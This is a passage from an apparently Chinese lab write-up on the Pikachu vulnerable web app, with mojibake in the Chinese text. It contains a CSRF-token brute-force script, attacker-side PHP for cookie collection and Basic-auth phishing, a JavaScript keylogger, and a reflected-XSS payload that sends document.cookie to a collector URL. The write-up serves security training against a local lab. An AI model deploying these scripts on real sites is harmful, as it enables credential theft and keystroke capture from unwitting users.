class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.pikachu.com/vul/burteforce/bf_token.php&quot;</span></span><br><span class="line">userList = <span class="string">&quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot;</span></span><br><span class="line">pwdList = <span class="string">&quot;/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phpsessid</span>():</span><br><span class="line">    res0 = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">    phpsessid = re.<span class="keyword">match</span>(<span class="string">&quot;PHPSESSID=(.*?);&quot;</span>, res0.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    phpsessid = phpsessid.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res0, phpsessid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">res</span>):</span><br><span class="line">    soup = BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">&quot;input&quot;</span>, attrs=&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;hidden&quot;</span>, <span class="string">&quot;name&quot;</span>:<span class="string">&quot;token&quot;</span>&#125;)[<span class="number">0</span>][<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">phpsessid, username, password, token</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password, </span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies = <span class="built_in">dict</span>(PHPSESSID=phpsessid)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, cookies=cookies, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(userList) <span class="keyword">as</span> file_obj_user:</span><br><span class="line">        usernames = file_obj_user.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pwdList) <span class="keyword">as</span> file_obj_pwd:</span><br><span class="line">        passwords = file_obj_pwd.readlines()</span><br><span class="line"></span><br><span class="line">    res, phpsessid = get_phpsessid()</span><br><span class="line">    token = get_token(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">            username = username.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            password = password.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            res = login(phpsessid, username, password, token)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username or password is not existsï½&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;username:&#123;&#125; / password:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(username, password))</span><br><span class="line">            </span><br><span class="line">            token = get_token(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    brute_force()</span><br></pre></td></tr></table></figure>

<h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross Site Scripting"></a>Cross Site Scripting</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸€èˆ¬çš„é˜²å¾¡æ–¹æ³•ï¼š</p>
<ul>
<li>è¾“å…¥è¿‡æ»¤ï¼šä¸å…è®¸å¯èƒ½å¯¼è‡´XSSçš„å­—ç¬¦è¾“å…¥</li>
<li>è¾“å‡ºè½¬ä¹‰ï¼šå¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰</li>
</ul>
<p>å½’çº³ï¼šå“ªä¸ªç«™ç‚¹æœ‰XSSï¼Œå°±å¯ä»¥å¾—åˆ°å“ªä¸ªç«™ç‚¹çš„cookie</p>
<h3 id="æ”»å‡»è€…ç«¯"><a href="#æ”»å‡»è€…ç«¯" class="headerlink" title="æ”»å‡»è€…ç«¯"></a>æ”»å‡»è€…ç«¯</h3><p>æœ€ç®€å•çš„æƒ…å†µï¼Œåº”è¯¥å°±æ˜¯é€šè¿‡XSSæå‰ç«¯ç”¨æˆ·çš„cookie</p>
<p>é¶åœºæœ¬èº«æä¾›äº†ä¸€ä¸ª<a href="www.pikachu.com/pkxss/xssmanager.php">XSSçš„æ”»å‡»è€…åå°</a>ï¼Œæ¨¡æ‹Ÿæ”»å‡»è€…ç«¯å¯ä»¥è¿›è¡Œçš„è¡Œä¸ºï¼Œè¿™é‡Œç»™å‡ºäº†ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<ul>
<li><p>cookieæœé›†</p>
</li>
<li><p>ä¿¡æ¯é’“é±¼</p>
</li>
<li><p>é”®ç›˜è®°å½•</p>
</li>
</ul>
<p>å®é™…æƒ…å†µä¸­æ”»å‡»è€…ä¼šæ‹¥æœ‰è‡ªå·±çš„ä¸€å°æœåŠ¡å™¨</p>
<p>å…·ä½“æ€ä¹ˆå†™ä»£ç å»åˆ©ç”¨ï¼Œä¸‹é¢å°±ç ”ç©¶ç ”ç©¶<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45868644/article/details/120192536">åˆ«äººçš„åšå®¢</a>ï¼Œå¹¶åˆ†æä¸€æ³¢æ”»å‡»ä»£ç </p>
<h4 id="cookieæœé›†"><a href="#cookieæœé›†" class="headerlink" title="cookieæœé›†"></a>cookieæœé›†</h4><p>æ”»å‡»è€…æœåŠ¡å™¨ä¸Šéƒ¨ç½²å¦‚ä¸‹çš„æ•è·cookieç­‰ä¿¡æ¯çš„APIï¼Œæ–‡ä»¶åcookie.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è¿™ä¸ªæ˜¯è·å–cookieçš„apié¡µé¢</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‰é¢æ˜¯æ•°æ®åº“è¿æ¥ç›¸å…³</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡ä¸€ä¸ªå‚æ•°ï¼ˆè¿™é‡Œæ˜¯â€œcookieâ€ï¼‰æ¥æ¥æ”¶ä¼ è¿‡æ¥çš„å€¼</span></span><br><span class="line"><span class="comment">// è·å–æ—¶é—´ã€cookieã€user agentç­‰ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$ipaddress</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// å°†ä¿¡æ¯æ’å…¥æ”»å‡»è€…æ•°æ®åº“</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ipaddress</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€åå°†é¡µé¢é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™ï¼Œèµ·åˆ°è¿·æƒ‘ä½œç”¨</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¾å®šç±»ä¼¼çš„è®¿é—®URLï¼š<a target="_blank" rel="noopener" href="http://www.pikachu.com/pkxss/xcookie/cookie.php">http://www.pikachu.com/pkxss/xcookie/cookie.php</a><br>é€šè¿‡æŒ‡å®šå‚æ•°æ¥ä¼ é€’è¦æ•è·çš„ä¿¡æ¯ï¼š<br><code>&#39;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie</code></p>
<p>å¦‚æœ‰å¿…è¦ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå·±æ•´ä¸€ä¸ªä¸“é—¨ç”¨äºæŸ¥çœ‹å’Œç®¡ç†æ•è·ä¿¡æ¯çš„é¡µé¢</p>
<p>ç„¶åå°±æ˜¯ç¤¾å·¥ã€é’“é±¼ï¼Œæ„é€ ä¸€äº›<strong>è®©äººé˜²ä¸èƒœé˜²çš„æ¶æ„è¿æ¥æˆ–å†…å®¹</strong>ç»™å—å®³è€…<br>é€šè¿‡å­˜åœ¨XSSæ¼æ´çš„ç«™ç‚¹ï¼Œæ¥è®©å—å®³è€…å‘é€ç‰¹å®šå†…å®¹ç»™æ”»å‡»è€…<br>å³è®©å—å®³è€…é€šè¿‡XSSæ¼æ´å‘é€ç±»ä¼¼äºè¿™æ ·çš„è¯·æ±‚ï¼š</p>
<p><code>http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie</code></p>
<p>å…·ä½“ä¾‹å­è§<a href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88GET%EF%BC%89">åå°„å‹XSSï¼ˆGETï¼‰</a>ä»¥åŠ<a href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88POST%EF%BC%89">åå°„å‹XSSï¼ˆPOSTï¼‰</a></p>
<h4 id="ä¿¡æ¯é’“é±¼"><a href="#ä¿¡æ¯é’“é±¼" class="headerlink" title="ä¿¡æ¯é’“é±¼"></a>ä¿¡æ¯é’“é±¼</h4><p>æ”»å‡»è€…å¯ä»¥å…ˆå†™å¥½ä¸‹é¢çš„é’“é±¼è„šæœ¬ï¼Œæ–‡ä»¶åfish.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// var_dump($_SERVER);</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line">	<span class="comment">// å‘é€è®¤è¯æ¡†ï¼Œå¹¶ç»™å‡ºè¿·æƒ‘æ€§çš„info</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;WWW-Authenticate: Basic realm=&#x27;è®¤è¯&#x27;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line">	<span class="comment">// å°†ç»“æœå‘é€ç»™æœé›†ä¿¡æ¯çš„åå°</span></span><br><span class="line">	<span class="comment">// xfish.phpæ˜¯ä¸€ä¸ªå°†ä¿¡æ¯æ’å…¥åˆ°æ•°æ®åº“çš„API</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span></span></span><br><span class="line"><span class="string">    &amp;password=<span class="subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>å¯èƒ½éœ€è¦äº‹å…ˆç†è§£ä¸€ä¸‹<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaotank/p/11009796.html">Basicè®¤è¯çš„æ¦‚å¿µ</a><br>å¤§æ¦‚å°±æ˜¯ï¼Œä¸€ç§å¾ˆåŸºæœ¬çš„HTTPè®¤è¯æ–¹å¼</p>
<ol>
<li><p>å®¢æˆ·ç«¯è¯·æ±‚</p>
</li>
<li><p>æœåŠ¡ç«¯åˆ¤æ–­ï¼Œæ²¡æœ‰è®¤è¯å°±è¿”å›401â€œæœªè®¤è¯â€ï¼Œå¹¶ç»™å‡ºè®¤è¯æ¶ˆæ¯<br>å…·ä½“æ˜¯åœ¨å“åº”headerä¸­æ·»åŠ <code>WWW-Authenticate</code>å¤´<br>ä¾‹å¦‚<code>WWW-Authenticate: Basic realm=&quot;ä½ è¿˜æ²¡æœ‰è®¤è¯&quot;</code><br>å®¢æˆ·ç«¯æ”¶åˆ°è¿™ä¸ªheaderå¤´ï¼Œæ£€æŸ¥åˆ°<code>Basic</code>ï¼Œå°±ä¼šå¼¹å‡ºè¾“å…¥æ¡†è¦æ±‚è®¤è¯</p>
</li>
<li><p>ç”¨æˆ·å‘é€è®¤è¯å†…å®¹<br>å…·ä½“æ˜¯åœ¨è¯·æ±‚headerä¸­æ·»åŠ <code>Authorization</code>å¤´<br>ä¾‹å¦‚<code>Authorization: Basic &#123;BASE64ç¼–ç åçš„è®¤è¯å†…å®¹&#125;</code><br>JWTå¥½åƒç”¨çš„å°±æ˜¯è¿™ä¸ªï¼Ÿæ³¨æ„æ˜¯ç¼–ç ï¼Œä¸æ˜¯åŠ å¯†</p>
</li>
<li><p>æœåŠ¡ç«¯æ£€æŸ¥è®¤è¯ï¼Œè¿”å›200&#x2F;403ï¼Œç„¶åè¿›ä¸€æ­¥å¤„ç†</p>
</li>
<li><p>æ­¤åç”¨æˆ·æ¯æ¬¡è¯·æ±‚éƒ½å¸¦ä¸Š<code>Authorization</code>å¤´</p>
</li>
</ol>
<hr>
<p>ä¸Šè¿°fish.phpä¸­çš„ä»£ç å¤§æ¦‚å°±æ˜¯å®ç°äº†ä¸€ä¸ªç®€å•çš„Basicå¼¹çª—è®¤è¯<br>é€šè¿‡è¿·æƒ‘æ€§çš„å¼¹çª—å†…å®¹ï¼Œè®©ç”¨æˆ·è¾“å…¥æ•æ„Ÿä¿¡æ¯<br>ç„¶åå°†æ•æ„Ÿä¿¡æ¯å‘é€ç»™æ”»å‡»è€…</p>
<p>å…·ä½“ä¾‹å­è§<a href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS">å­˜å‚¨å‹XSS</a></p>
<h4 id="é”®ç›˜è®°å½•"><a href="#é”®ç›˜è®°å½•" class="headerlink" title="é”®ç›˜è®°å½•"></a>é”®ç›˜è®°å½•</h4><p>æ”»å‡»è€…å¯ä»¥å…ˆå†™å¥½ä¸‹é¢çš„é”®ç›˜è®°å½•JSè„šæœ¬<br>æ”¾åˆ°æ”»å‡»è€…æœåŠ¡å™¨ï¼Œä½†æ˜¯è¢«åŠ è½½åˆ°å—å®³è€…æµè§ˆå™¨çš„<br>å‘½åä¸ºrk.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createAjax</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> request = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="keyword">if</span>(request.<span class="property">overrideMimeType</span>) &#123;</span><br><span class="line">            request.<span class="title function_">overrideMimeType</span>(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> versions = [<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>, <span class="string">&#x27;MSXML.XMLHTTP&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.7.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.6.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;versions.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                request = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(versions[i]);</span><br><span class="line">                <span class="keyword">if</span>(request) &#123;</span><br><span class="line">                    <span class="keyword">return</span> request;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                request=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> xl = <span class="string">&quot;datax=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onkeypress</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);</span><br><span class="line">    xl += realkey;</span><br><span class="line">    <span class="title function_">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = onkeypress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ajax = <span class="title function_">createAjax</span>();</span><br><span class="line">    ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ajax.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ajax.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> data = ajax.<span class="property">responseText</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;é¡µé¢è¯·æ±‚å¤±è´¥&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†é”®ç›˜è®°å½•å‘é€åˆ°æ¥æ”¶APIï¼šrkserver.php</span></span><br><span class="line">    <span class="keyword">var</span> postdate = xl;</span><br><span class="line">    ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://www.pikachu.com/pkxss/rkeypress/rkserver.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-length&quot;</span>, postdate.<span class="property">length</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">send</span>(postdate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ”»å‡»è€…è¿˜å¾—å‡†å¤‡ä¸€ä¸ªæ¥æ”¶è®°å½•çš„APIï¼šrkserver.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æ•°æ®åº“è¿æ¥è®¾ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å…è®¸è¢«è·¨åŸŸè®¿é—®</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin:*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;datax&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert keypress(data) values(&#x27;<span class="subst">$data</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢è¦åšçš„ï¼Œå°±æ˜¯åœ¨å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´çš„é¡µé¢<br>æ‰“å…¥ä¸€ä¸ªpayloadï¼Œä½¿å—å®³è€…åŠ è½½rk.jsï¼Œå¹¶ç¡®ä¿JSè„šæœ¬èƒ½å¤Ÿèµ·ä½œç”¨ï¼ˆä¾‹å¦‚èƒ½è·¨åŸŸï¼‰<br>è¿™æ ·å—å®³è€…çš„é”®ç›˜è®°å½•éƒ½ä¼šè¢«æ”»å‡»è€…è®°å½•</p>
<p>å…·ä½“ä¾‹å­è§<a href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS">å­˜å‚¨å‹XSS</a></p>
<h3 id="åå°„å‹XSSï¼ˆGETï¼‰"><a href="#åå°„å‹XSSï¼ˆGETï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆGETï¼‰"></a>åå°„å‹XSSï¼ˆGETï¼‰</h3><p>å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰å›æ˜¾ï¼Œè¾“å…¥ï¼Œæœ‰</p>
<p>tryï¼Œèƒ½Xåˆ°æœ¬é¡µé¢ï¼Œ<del>å‘ç°æœ‰å‰ç«¯é•¿åº¦é™åˆ¶ï¼Œæ”¹HTMLï¼Œ</del>Xçˆ†<br>ï¼ˆå®é™…ä¸Šä¸ç”¨æ”¹å‰ç«¯HTMLä¹Ÿè¡Œï¼Œç›´æ¥ä¿®æ”¹URLä¸­çš„å‚æ•°å³å¯ï¼‰</p>
<p>è§‚å¯ŸURLï¼Œæ˜¯GETä¼ é€’payloadï¼š<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=Archeri&amp;submit=submit</code></p>
<p>å¼¹çª—æµ‹è¯•æˆåŠŸï¼š<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&amp;submit=submit</code></p>
<p>ä¸‹é¢æ¨¡æ‹Ÿæ”»å‡»è€…å‘ç°äº†è¿™é‡Œæœ‰åå°„å‹XSSæ¼æ´-GET</p>
<p>æ”»å‡»è€…å‡†å¤‡å¥½äº†<a href="#cookie%E6%90%9C%E9%9B%86">ä¸Šè¿°çš„æ¶æ„æœåŠ¡å™¨</a>ï¼Œæ„é€ XSSè„šæœ¬ï¼š<br><code>&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></p>
<p>ç„¶åå½¢æˆpayloadæ„é€ é’“é±¼è¿æ¥ï¼Œæ³¨æ„URLç¼–ç å¤„ç†ï¼Œå¦åˆ™ä¸ä¸€å®šèƒ½èµ·ä½œç”¨ï¼š<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E&amp;submit=submit</code></p>
<p>ç„¶åé€šè¿‡ç¤¾å·¥æ–¹æ³•ï¼Œå¼•è¯±å—å®³è€…ç‚¹å‡»&#x2F;åŠ è½½é“¾æ¥<br>è¿™é‡Œç›´æ¥åœ°å€æ è¾“å…¥è®¿é—®â€¦.<br>ç»“æœæ˜¯ï¼Œä¼šçŸ­æš‚å‡ºç°Pikachué¶åœºçš„é¡µé¢ï¼Œéšå³è·³è½¬è‡³ç™¾åº¦</p>
<p>ç„¶åçœ‹çœ‹æ”»å‡»è€…åå°ï¼Œæ”¶é›†åˆ°äº†cookieè®°å½•ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030093943556.png" alt="image-20211030093943556"></p>
<h3 id="åå°„å‹XSSï¼ˆPOSTï¼‰"><a href="#åå°„å‹XSSï¼ˆPOSTï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆPOSTï¼‰"></a>åå°„å‹XSSï¼ˆPOSTï¼‰</h3><p>ç™»å½•æ¡†ï¼Œè¦æ±‚å…ˆç™»å½•ï¼Ÿ</p>
<p>é‚£å°±<code>admin/123456</code>ç™»è¿›å»ï¼Œç„¶ååŒæ ·æ˜¯ä¸€æ ·çš„è¾“å…¥æ¡†</p>
